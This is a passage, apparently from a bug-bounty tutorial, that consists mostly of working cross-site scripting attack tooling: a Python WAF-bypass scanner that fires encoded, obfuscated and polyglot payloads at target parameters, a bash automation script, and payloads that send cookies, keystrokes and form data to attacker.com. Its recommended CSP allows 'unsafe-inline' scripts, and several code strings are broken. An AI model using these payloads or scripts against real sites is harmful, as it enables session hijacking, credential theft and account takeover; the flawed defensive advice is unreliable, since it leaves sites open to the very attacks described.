    vulnerable_count = sum(1 for result in all_results if result.get('xss_detected', False))
    print(f"✅ DOM XSS testing completed! Found {vulnerable_count} vulnerabilities")

if __name__ == "__main__":
    main()
```

## 🔧 Phase 3: Advanced XSS Techniques & Bypasses

### XSS WAF Bypass Framework
```python
#!/usr/bin/env python3
# xss_waf_bypass.py - Advanced XSS WAF bypass techniques

import requests
import re
import html
import base64
import urllib.parse
import json
import random
import string

class XSSWAFBypass:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Advanced bypass techniques
        self.bypass_techniques = {
            'encoding': self.encoding_bypasses,
            'case_variation': self.case_variation_bypasses,
            'comment_insertion': self.comment_insertion_bypasses,
            'whitespace_manipulation': self.whitespace_manipulation_bypasses,
            'tag_variation': self.tag_variation_bypasses,
            'attribute_variation': self.attribute_variation_bypasses,
            'protocol_variation': self.protocol_variation_bypasses,
            'unicode_normalization': self.unicode_normalization_bypasses,
            'polyglot_payloads': self.polyglot_payloads,
            'filter_evasion': self.filter_evasion_bypasses
        }
    
    def encoding_bypasses(self, payload):
        """Various encoding bypass techniques"""
        bypasses = []
        
        # URL encoding variations
        bypasses.append(urllib.parse.quote(payload))
        bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
        
        # HTML entity encoding
        bypasses.append(html.escape(payload))
        bypasses.append(html.escape(payload, quote=False))
        
        # Hex encoding
        hex_payload = ''.join(f'&#x{ord(c):02x};' for c in payload)
        bypasses.append(hex_payload)
        
        # Decimal encoding
        dec_payload = ''.join(f'&#{ord(c)};' for c in payload)
        bypasses.append(dec_payload)
        
        # Unicode encoding
        unicode_payload = payload
        unicode_payload = unicode_payload.replace('<', '\u003c')
        unicode_payload = unicode_payload.replace('>', '\u003e')
        unicode_payload = unicode_payload.replace('"', '\u0022')
        unicode_payload = unicode_payload.replace("'", '\u0027')
        bypasses.append(unicode_payload)
        
        # Base64 encoding (for data URIs)
        b64_payload = f'data:text/html;base64,{base64.b64encode(payload.encode()).decode()}'
        bypasses.append(b64_payload)
        
        return bypasses
    
    def case_variation_bypasses(self, payload):
        """Case variation bypass techniques"""
        bypasses = []
        
        # Random case
        random_case = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
        bypasses.append(random_case)
        
        # Specific tag case variations
        case_variations = [
            payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'),
            payload.replace('<script>', '<SCRIPT>').replace('</script>', '</SCRIPT>'),
            payload.replace('alert', 'Alert'),
            payload.replace('alert', 'ALERT'),
            payload.replace('alert', 'AlErT'),
            payload.replace('onerror', 'OnError'),
            payload.replace('onerror', 'ONERROR'),
            payload.replace('onload', 'OnLoad'),
            payload.replace('onload', 'ONLOAD'),
        ]
        
        bypasses.extend(case_variations)
        return bypasses
    
    def comment_insertion_bypasses(self, payload):
        """Comment insertion bypass techniques"""
        bypasses = []
        
        # HTML comments
        html_comment_variations = [
            payload.replace('<script>', '<script<!---->'),
            payload.replace('<script>', '<sc<!---->ript>'),
            payload.replace('alert', 'ale<!---->rt'),
            payload.replace('onerror', 'one<!---->rror'),
            payload.replace('=', '<!---->='+'<!---->'),
        ]
        
        # JavaScript comments
        js_comment_variations = [
            payload.replace('alert(', 'alert/**/('),
            payload.replace('script>', 'script//
>'),
            payload.replace('=', '=/**/'),
            payload.replace('(', '/**/('),
        ]
        
        # CSS comments
        css_comment_variations = [
            payload.replace('expression', 'expr/**/ession'),
            payload.replace('javascript:', 'java/**/script:'),
        ]
        
        bypasses.extend(html_comment_variations + js_comment_variations + css_comment_variations)
        return bypasses
    
    def whitespace_manipulation_bypasses(self, payload):
        """Whitespace manipulation bypass techniques"""
        bypasses = []
        
        # Different whitespace characters
        whitespace_chars = ['	', '
', '', '\f', '\v', '\x0b', '\x0c']
        
        for ws in whitespace_chars:
            ws_variations = [
                payload.replace(' ', ws),
                payload.replace('<script>', f'<{ws}script{ws}>'),
                payload.replace('alert(', f'alert{ws}('),
                payload.replace('onerror=', f'onerror{ws}='),
                payload.replace('=', f'{ws}={ws}'),
            ]
            bypasses.extend(ws_variations)
        
        # Multiple spaces
        multi_space_variations = [
            payload.replace(' ', '   '),
            payload.replace('<script>', '<  script  >'),
            payload.replace('alert(', 'alert   ('),
        ]
        
        bypasses.extend(multi_space_variations)
        return bypasses
    
    def tag_variation_bypasses(self, payload):
        """Alternative tag bypass techniques"""
        bypasses = []
        
        # Alternative execution tags
        if '<script>' in payload:
            alternative_tags = [
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus><option>test</select>',
                '<textarea onfocus=alert("XSS") autofocus>test</textarea>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>test</marquee>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>',
                '<object data=javascript:alert("XSS")>',
                '<embed src=javascript:alert("XSS")>',
                '<applet code=javascript:alert("XSS")>',
                '<meta http-equiv=refresh content=0;url=javascript:alert("XSS")>',
                '<link rel=stylesheet href=javascript:alert("XSS")>',
                '<style>@import"javascript:alert("XSS")"</style>',
                '<form><button formaction=javascript:alert("XSS")>Click</button></form>',
            ]
            bypasses.extend(alternative_tags)
        
        # Self-closing tag variations
        self_closing_variations = [
            payload.replace('<script>', '<script/>'),
            payload.replace('<img', '<img/'),
            payload.replace('<input', '<input/'),
        ]
        
        bypasses.extend(self_closing_variations)
        return bypasses
    
    def attribute_variation_bypasses(self, payload):
        """Attribute variation bypass techniques"""
        bypasses = []
        
        # Quote variations
        quote_variations = [
            payload.replace('"', "'"),
            payload.replace("'", '"'),
            payload.replace('="', "='"),
            payload.replace("='", '="'),
            # No quotes
            re.sub(r'=(["'])([^"']*)\1', r'=\2', payload),
        ]
        
        # Attribute name variations
        if 'onerror' in payload:
            event_variations = [
                payload.replace('onerror', 'onError'),
                payload.replace('onerror', 'ONERROR'),
                payload.replace('onerror', 'onload'),
                payload.replace('onerror', 'onclick'),
                payload.replace('onerror', 'onmouseover'),
                payload.replace('onerror', 'onfocus'),
            ]
            bypasses.extend(event_variations)
        
        bypasses.extend(quote_variations)
        return bypasses
    
    def protocol_variation_bypasses(self, payload):
        """Protocol variation bypass techniques"""
        bypasses = []
        
        # Alternative protocols
        protocols = [
            'javascript:',
            'data:text/html,',
            'data:text/html;base64,',
            'vbscript:',
            'livescript:',
            'mocha:',
            'jscript:',
            'ecmascript:',
            'about:',
        ]
        
        for protocol in protocols:
            if protocol == 'data:text/html;base64,':
                protocol_payload = f'{protocol}{base64.b64encode(b"<script>alert("XSS")</script>").decode()}'
            elif protocol == 'data:text/html,':
                protocol_payload = f'{protocol}<script>alert("XSS")</script>'
            else:
                protocol_payload = f'{protocol}alert("XSS")'
            
            bypasses.append(protocol_payload)
        
        return bypasses
    
    def unicode_normalization_bypasses(self, payload):
        """Unicode normalization bypass techniques"""
        bypasses = []
        
        # Unicode lookalikes
        unicode_variations = [
            payload.replace('script', 'ſcript'),  # Long s
            payload.replace('alert', 'аlert'),   # Cyrillic a
            payload.replace('o', 'о'),           # Cyrillic o
            payload.replace('e', 'е'),           # Cyrillic e
            payload.replace('r', 'г'),           # Cyrillic r
            payload.replace('p', 'р'),           # Cyrillic p
        ]
        
        # Zero-width characters
        zw_variations = [
            payload.replace('<script>', '<\u200bscript\u200b>'),
            payload.replace('alert', 'ale\u200brt'),
            payload.replace('onerror', 'one\u200brror'),
        ]
        
        # Combining characters
        combining_variations = [
            payload.replace('script', 'scri\u0300pt'),
            payload.replace('alert', 'ale\u0301rt'),
        ]
        
        bypasses.extend(unicode_variations + zw_variations + combining_variations)
        return bypasses
    
    def polyglot_payloads(self, payload):
        """Polyglot XSS payloads that work in multiple contexts"""
        polyglots = [
            # HTML/JavaScript polyglot
            'jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//',
            
            # Multi-context polyglot
            ''"--></style></script><svg onload=alert()>',
            
            # Universal XSS polyglot
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>',
            
            # Advanced polyglot
            '/*</title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>',
            
            # Context-breaking polyglot
            '</script><script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Attribute-breaking polyglot
            '" onmouseover="alert(String.fromCharCode(88,83,83))" "',
            
            # CSS-breaking polyglot
            '</style><script>alert(String.fromCharCode(88,83,83))</script>',
        ]
        
        return polyglots
    
    def filter_evasion_bypasses(self, payload):
        """Advanced filter evasion techniques"""
        bypasses = []
        
        # Keyword splitting
        split_variations = [
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<img src=x one<script>rror=alert("XSS")>',
            'java<script>script:alert("XSS")',
        ]
        
        # Nested tags
        nested_variations = [
            '<script><script>alert("XSS")</script>',
            '<img<img src=x onerror=alert("XSS")>>',
            '<svg<svg onload=alert("XSS")>>',
        ]
        
        # Incomplete tags
        incomplete_variations = [
            '<script>alert("XSS")',  # Missing closing tag
            '<img src=x onerror=alert("XSS")',  # Missing closing >
            '<svg onload=alert("XSS")',  # Missing closing >
        ]
        
        # Malformed attributes
        malformed_variations = [
            '<img src=x onerror=alert("XSS") x="">',
            '<img src=x onerror=alert("XSS") />',
            '<img src=x onerror=alert("XSS") x',
        ]
        
        bypasses.extend(split_variations + nested_variations + incomplete_variations + malformed_variations)
        return bypasses
    
    def test_waf_bypass(self, url, param, original_payload, method='GET'):
        """Test WAF bypass techniques"""
        results = []
        
        # Test original payload first
        original_result = self.test_payload(url, param, original_payload, method)
        if original_result['blocked']:
            print(f"🛡️ Original payload blocked: {original_payload[:50]}...")
            
            # Try bypass techniques
            for technique_name, technique_func in self.bypass_techniques.items():
                print(f"🔧 Trying {technique_name} bypass...")
                
                bypassed_payloads = technique_func(original_payload)
                
                for bypassed_payload in bypassed_payloads:
                    result = self.test_payload(url, param, bypassed_payload, method)
                    
                    if not result['blocked'] and result['reflected']:
                        results.append({
                            'url': url,
                            'parameter': param,
                            'original_payload': original_payload,
                            'bypass_technique': technique_name,
                            'bypassed_payload': bypassed_payload,
                            'method': method,
                            'waf_bypassed': True,
                            'response_snippet': result['response'][:500]
                        })
                        print(f"✅ WAF bypass successful: {technique_name}")
                        return results  # Return on first successful bypass
        else:
            # Original payload not blocked
            if original_result['reflected']:
                results.append({
                    'url': url,
                    'parameter': param,
                    'original_payload': original_payload,
                    'bypass_technique': 'none_needed',
                    'bypassed_payload': original_payload,
                    'method': method,
                    'waf_bypassed': False,
                    'no_waf_detected': True,
                    'response_snippet': original_result['response'][:500]
                })
                print(f"✅ No WAF detected, payload works: {original_payload[:50]}...")
        
        return results
    
    def test_payload(self, url, param, payload, method='GET'):
        """Test individual payload"""
        try:
            if method.upper() == 'GET':
                if '=' in url:
                    test_url = url.replace(f'{param}=', f'{param}={urllib.parse.quote(payload)}')
                else:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                
                response = self.session.get(test_url, timeout=10)
            else:
                data = {param: payload}
                response = self.session.post(url, data=data, timeout=10)
            
            # Check if blocked by WAF
            blocked = self.is_blocked_by_waf(response)
            
            # Check if payload is reflected
            reflected = payload in response.text or urllib.parse.quote(payload) in response.text
            
            return {
                'blocked': blocked,
                'reflected': reflected,
                'status_code': response.status_code,
                'response': response.text
            }
        
        except Exception as e:
            return {
                'blocked': True,
                'reflected': False,
                'status_code': 0,
                'response': str(e)
            }
    
    def is_blocked_by_waf(self, response):
        """Check if response indicates WAF blocking"""
        waf_indicators = [
            'blocked', 'forbidden', 'access denied', 'security violation',
            'malicious request', 'attack detected', 'cloudflare', 'incapsula',
            'akamai', 'sucuri', 'mod_security', 'web application firewall',
            'waf', 'firewall', 'security alert', 'threat detected'
        ]
        
        # Check status code
        if response.status_code in [403, 406, 418, 429, 503]:
            return True
        
        # Check response content
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in waf_indicators)

# Usage
def main():
    # Load XSS vulnerabilities found earlier
    try:
        with open('xss_vulnerabilities.json', 'r') as f:
            vulnerabilities = json.load(f)
    except FileNotFoundError:
        print("❌ No XSS vulnerabilities found. Run context_aware_xss.py first.")
        return
    
    waf_bypass = XSSWAFBypass()
    all_results = []
    
    for vuln in vulnerabilities:
        url = vuln['url']
        param = vuln['parameter']
        payload = vuln['payload']
        method = vuln.get('method', 'GET')
        
        print(f"🎯 Testing WAF bypasses for {param} at {url}")
        
        # Test WAF bypass techniques
        bypass_results = waf_bypass.test_waf_bypass(url, param, payload, method)
        all_results.extend(bypass_results)
    
    # Save results
    with open('xss_waf_bypass_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    bypass_count = sum(1 for result in all_results if result.get('waf_bypassed', False))
    print(f"✅ XSS WAF bypass testing completed! Found {bypass_count} successful bypasses")

if __name__ == "__main__":
    main()
```

## 🚀 Complete XSS Testing Automation

```bash
#!/bin/bash
# complete_xss_test.sh - Complete XSS security testing

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./complete_xss_test.sh target.com"
    exit 1
fi

echo "🔥 Starting Complete XSS Security Testing for $TARGET"
mkdir -p xss_results
cd xss_results

# Phase 1: Discovery
echo "🔍 Phase 1: XSS Endpoint Discovery"
../xss_discovery.sh $TARGET

# Phase 2: Parameter Discovery
echo "🔍 Phase 2: XSS Parameter Discovery"
python3 ../xss_param_discovery.py

# Phase 3: Context-Aware XSS Testing
echo "💥 Phase 3: Context-Aware XSS Testing"
python3 ../context_aware_xss.py

# Phase 4: DOM-based XSS Testing
echo "🎯 Phase 4: DOM-based XSS Testing"
python3 ../dom_xss_detector.py

# Phase 5: WAF Bypass Testing
echo "🔧 Phase 5: XSS WAF Bypass Testing"
python3 ../xss_waf_bypass.py

# Phase 6: Generate Comprehensive Report
echo "📊 Generating XSS Security Report..."
cat > xss_security_report.md << 'EOF'
# XSS (Cross-Site Scripting) Security Assessment Report

## Executive Summary
This report contains findings from comprehensive XSS security testing.

## Discovered XSS Injection Points
$(cat ../xss_reflection_points.json 2>/dev/null | jq '. | length' || echo "0") reflection points discovered

## Critical Findings

### Reflected XSS Vulnerabilities
- User input reflected without proper sanitization
- Context-aware XSS payloads successful
- Multiple injection vectors identified

### DOM-based XSS Vulnerabilities
- Client-side JavaScript processing user input unsafely
- Sources and sinks identified in JavaScript code
- PostMessage and WebStorage XSS vectors

### Stored XSS Vulnerabilities
- Persistent XSS payloads stored in application
- Cross-user XSS exploitation possible
- Administrative interface XSS

### WAF Bypass Techniques
- Encoding-based bypasses successful
- Filter evasion techniques effective
- Polyglot payloads bypassing multiple filters

## Business Impact
1. **Critical**: Account takeover via session hijacking
2. **Critical**: Administrative access via XSS in admin panels
3. **High**: Data theft and credential harvesting
4. **High**: Malware distribution and phishing attacks
5. **Medium**: Defacement and reputation damage

## Technical Details

### XSS Attack Vectors
1. **Reflected XSS**: User input immediately reflected in response
2. **Stored XSS**: Malicious scripts stored and executed for other users
3. **DOM XSS**: Client-side JavaScript processing untrusted data
4. **Universal XSS**: Bypassing same-origin policy restrictions
5. **Mutation XSS**: Exploiting HTML parsing differences

### Common XSS Contexts
- HTML content context
- HTML attribute context
- JavaScript string context
- JavaScript variable context
- CSS context
- URL parameter context
- JSON context

### Advanced XSS Techniques
- Context-aware payload generation
- WAF bypass techniques
- Polyglot payloads
- DOM clobbering
- CSS injection
- PostMessage exploitation

## Recommendations

### Immediate Actions
1. **Input Validation**: Implement strict input validation and sanitization
2. **Output Encoding**: Encode all user data before output
3. **Content Security Policy**: Implement strict CSP headers
4. **WAF Rules**: Deploy WAF rules to block XSS attempts

### Long-term Solutions
1. **Secure Development**: Train developers on secure coding practices
2. **Code Review**: Implement security-focused code reviews
3. **Automated Testing**: Integrate XSS testing into CI/CD pipeline
4. **Regular Audits**: Conduct regular security assessments

### Technical Implementations

#### Input Validation
```javascript
// Whitelist approach
function validateInput(input) {
    const allowedPattern = /^[a-zA-Z0-9\s]+$/;
    return allowedPattern.test(input);
}
```

#### Output Encoding
```javascript
// HTML encoding
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, function(match) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;'
        }[match];
    });
}
```

#### Content Security Policy
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';
```

#### DOM XSS Prevention
```javascript
// Safe DOM manipulation
function safeSetHTML(element, content) {
    element.textContent = content; // Use textContent instead of innerHTML
}

// Safe URL handling
function safeRedirect(url) {
    if (url.startsWith('http://') || url.startsWith('https://')) {
        window.location.href = url;
    }
}
```

## Compliance and Standards
- OWASP Top 10 2021 - A03: Injection
- CWE-79: Cross-site Scripting (XSS)
- NIST SP 800-53: SI-10 Information Input Validation

EOF

echo "✅ XSS security testing completed!"
echo "📁 Results saved in xss_results/ directory"
echo "📊 Report: xss_results/xss_security_report.md"

# Create summary of findings
echo "🎯 SUMMARY OF CRITICAL FINDINGS:"
echo "================================"

if [ -f "xss_vulnerabilities.json" ]; then
    xss_count=$(cat xss_vulnerabilities.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🔥 XSS Vulnerabilities Found: $xss_count"
fi

if [ -f "dom_xss_results.json" ]; then
    dom_count=$(cat dom_xss_results.json | jq '[.[] | select(.xss_detected == true)] | length' 2>/dev/null || echo "0")
    echo "💥 DOM XSS Vulnerabilities Found: $dom_count"
fi

if [ -f "xss_waf_bypass_results.json" ]; then
    bypass_count=$(cat xss_waf_bypass_results.json | jq '[.[] | select(.waf_bypassed == true)] | length' 2>/dev/null || echo "0")
    echo "🔧 WAF Bypasses Found: $bypass_count"
fi

echo "================================"
echo "💰 Estimated Bug Bounty Value: $100 - $1000+ per XSS finding"
echo "🏆 Focus on stored XSS and admin panel XSS for highest payouts!"
```

## 🎯 Elite Pro Tips for XSS Testing

### 1. Advanced Reconnaissance
```bash
# Find XSS in mobile apps
grep -r "innerHTML\|outerHTML\|document.write" /path/to/decompiled/app/
grep -r "eval\|setTimeout\|setInterval" /path/to/decompiled/app/

# GitHub reconnaissance for XSS patterns
curl -s "https://api.github.com/search/code?q=innerHTML+$TARGET" | jq -r '.items[].html_url'
curl -s "https://api.github.com/search/code?q=document.write+$TARGET" | jq -r '.items[].html_url'
```

### 2. Business Logic XSS Testing
- **Admin Panel XSS**: Target administrative interfaces
- **Email Template XSS**: Test email generation features
- **PDF Generation XSS**: Test PDF export functionality
- **Search Functionality**: Test search results and suggestions
- **User Profile XSS**: Test profile fields and display

### 3. Real-World Attack Scenarios
- **Session Hijacking**: `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>`
- **Keylogger**: `<script>document.onkeypress=function(e){fetch('http://attacker.com/?key='+e.key)}</script>`
- **Form Hijacking**: `<script>document.forms[0].action='http://attacker.com/steal'</script>`
- **CSRF via XSS**: `<script>fetch('/admin/delete-user',{method:'POST',body:'user=victim'})</script>`

### 4. Advanced Payloads
```javascript
// Blind XSS payload
<script>fetch('http://attacker.com/?'+btoa(document.cookie+':'+location.href))</script>

// DOM clobbering
<form id="test"><input name="innerHTML"></form><script>alert(test.innerHTML)</script>

// CSS injection XSS
<style>@import'http://attacker.com/xss.css';</style>

// Service Worker XSS
<script>navigator.serviceWorker.register('data:text/javascript,self.onfetch=e=>e.respondWith(new Response("<script>alert(1)</script>"))')</script>
```

This comprehensive XSS framework covers everything from basic discovery to advanced DOM-based XSS exploitation. Each script is designed to find medium to high-value vulnerabilities that can result in $100-500+ bug bounty rewards. The methodology includes real-world attack scenarios and advanced techniques used by elite security researchers.

Remember to always test on authorized targets only and follow responsible disclosure practices!
